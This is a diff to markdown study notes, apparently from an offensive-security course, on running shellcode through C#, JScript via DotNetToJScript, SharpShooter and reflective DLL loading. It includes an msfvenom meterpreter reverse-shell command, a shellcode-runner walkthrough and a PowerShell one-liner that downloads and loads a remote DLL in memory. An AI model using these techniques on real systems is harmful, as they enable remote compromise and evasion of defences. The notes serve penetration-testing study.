@@ -71,6 +71,7 @@ Compiled exe file can be found [here](./Compiled%20binaries/HelloWorld.exe)
 # DotNetToJScript
 
 A project created by James Forshaw in 2017 to execute C# assembly from JScript.
+
 Github Project : https://github.com/tyranid/DotNetToJScript
 
 We can download the latest release. The file also has an example compiled dll file which we can use for testing.
@@ -97,3 +98,122 @@ Explanation :
 &nbsp;
 
 # Win32 API calls from C#
+
+- Here we can import the Win32 API using the P/Invoke import statements.
+- Unlike what was done in powershell, in C# we can directly compile the assembly before sending it to the victim and hence it would get loaded to the memory directly.
+
+Code to execute a simple MessageBox Win32 API can be found [here](./C%23%20Programs/MessageBox.cs)
+
+Compiled source code in exe format can be found [here](./Compiled%20binaries/MessageBox.exe)
+
+Explanation :
+
+1. First the required libraries are imported.
+2. We then give a name to the namespace and create a class inside that.
+3. The import statement can be found in the https://www.pinoke.net website.
+4. The Main method has the Win32 API method which pops a message box.
+
+&nbsp;
+
+# Shellcode runner in C# using Win32 API
+
+We would be using the same methodology as the previous shellcodes. First we would allocate memory, copy the shellcode to it and then create a thread to execute it.
+
+Msfvenom command :
+
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f csharp EXITFUNC=thread
+
+![msfvenom](./images/msfvenom.png)
+
+&nbsp;
+
+C# Code can be found [here](./C%23%20Programs/ShellcodeRunner.cs)
+
+EXE file can be found [here](./Compiled%20binaries/ShellcodeRunner.exe)
+
+Explanation :
+
+1. We first import the namespaces containing important system classes
+2. We then specify the namespace and the classname of this project
+3. Import the win32 APIs using the P/Invoke Statements
+4. Store the shellcode in a variable
+5. Allocate memory using the _VirtualAlloc_ by specifying the required size, allocation type and protections.
+6. Copy the shellcode into the newly created memory by using the Copy() method.
+7. Execute the memory by using the _CreateThread_ Win32 API
+8. Use the _WaitForSingleObject_ Win32 API to stop the program from quitting immediately and wait for a shell exit to quit.
+
+> In-Depth explanation of the used Win32 APIs can be found [here](./../Client-Side-Code-Execution-With-Office/README.md#in-memory-shellcode-runner-in-vba)
+
+&nbsp;
+
+# Jscript Shellcode Runner
+
+C# code can be found [here](./C%23%20Programs/JscriptShellcode.cs)
+
+Compile DLL can be found [here](./Compiled%20binaries/JscriptShellcode.dll)
+
+Jscript can be found [here](./JScript/JscriptShellcode.js)
+
+Explanation:
+
+1. The procedure is the same as what happened in the C# shellcode execution.
+2. Here we set the ComVisible to true. This basically acts as a whitelist by preventing unnecessary exposure to COM
+3. It is important to make it public or else we would not be able to interact with the Component Object Model(COM)
+4. The remaining statements have alread been explained in the previous topic.
+
+DotNetToJscript command :
+
+![JscriptShellcode](./images/JscriptShellcode.png)
+
+&nbsp;
+
+> Documentation :
+>
+> - https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.comvisibleattribute?redirectedfrom=MSDN&view=net-6.0
+> - https://stackoverflow.com/questions/15688395/whats-the-deal-with-comvisible-default-and-public-classes-com-exposure
+> - https://www.whiteoaksecurity.com/blog/2020-1-23-advanced-ttps-dotnettojscript-part-2/
+
+&nbsp;
+
+# SharpShooter
+
+- A tool called SharpShooter can be used for payload generation of C# source code.
+- It leverages James Forshaw's DotNetToJScript
+- Github : https://github.com/mdsecactivebreach/SharpShooter
+- Example command :
+
+```
+python SharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile <msf generated shellcode> --output <output-filename>
+```
+
+&nbsp;
+
+# Reflective Load of Win32 API for In-Memory Powershell
+
+The C# source code can be found [here](./C%23%20Programs/ReflectiveLoad.cs)
+
+The compiled DLL can be found [here](./Compiled%20binaries/ReflectiveLoad.dll)
+
+Powershell script :
+
+    $data = (New-Object System.Net.WebClient).DownloadData('<DLL hosted link>')
+    $assem = [System.Reflection.Assembly]::Load($data)
+    $class = $assem.GetType("<namespace>.<classname>")
+    $method = $class.GetMethod("<method name>")
+    $method.Invoke(0, $null)
+
+&nbsp;
+
+Explanation :
+
+1. We first download the data of the hosted dll and store it in a variable
+2. We load the assembly in-memory using the Load() method from System.Reflection.Assembly
+3. We interact with the loaded DLL using the GetType and GetMethod functions.
+4. We then invoke the method hence executing the code in memory.
+
+&nbsp;
+
+> Documentation :
+>
+> - https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=netframework-4.8
+> - https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=netframework-4.8
